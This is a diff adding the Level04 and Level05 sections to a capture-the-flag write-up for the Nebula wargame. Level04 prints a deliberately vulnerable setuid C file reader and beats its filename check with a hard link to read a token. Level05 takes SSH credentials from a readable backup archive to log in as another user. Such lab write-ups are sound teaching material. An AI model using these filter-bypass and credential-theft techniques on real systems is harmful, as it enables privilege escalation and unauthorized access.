@@ -181,3 +181,85 @@ Make the last schipt executable and add it to the `writable.d` directory.
 Thi will generate an executable with the sticky bit, which will run the program
 with the id of the flag03 user, and will create a shell for us. There we can
 `getflag`.
+
+
+### Level04
+
+This level requires to read a token file, but the code restricts the files that
+can be read. Find a way to bypass it.
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char buf[1024];
+  int fd, rc;
+
+  if(argc == 1) {
+      printf("%s [file to read]\n", argv[0]);
+      exit(EXIT_FAILURE);
+  }
+
+  if(strstr(argv[1], "token") != NULL) {
+      printf("You may not access '%s'\n", argv[1]);
+      exit(EXIT_FAILURE);
+  }
+
+  fd = open(argv[1], O_RDONLY);
+  if(fd == -1) {
+      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
+  }
+
+  rc = read(fd, buf, sizeof(buf));
+
+  if(rc == -1) {
+      err(EXIT_FAILURE, "Unable to read fd %d", fd);
+  }
+
+  write(1, buf, rc);
+}
+
+```
+
+The `ls` for `/home/flag04` is:
+
+```
+flag04 token
+```
+
+All access disabled except for run the `flag04` file. As we can se in the code
+it checks only for the name of the file, then we can easily create a link with
+a different name but the same inode.
+
+```
+ln /home/flag04/token key
+/home/flag04/flag04 key
+06508b5e-8909-4f38-b630-fdb148a848a2
+```
+Now we can use that key as password to get access as a user `flag04`.
+```
+$su flag04
+password:
+sh-4.2$ whoami
+flag04
+sh-4.2$ /bin/getflag
+```
+
+### Level05
+
+Check the directory `/home/flag05`. Use the weak permissions to get acces and
+run the `getflag` command as flag05 user.
+
+The exploit here consist of a stole the ssh cretentials that were available in
+the directoy.
+```
+tar xvzf /home/flag05/.backup/backup-19072011.tgz -C ~
+ssh flag05@localhost
+flag05@nebula:~$ getflag
+```
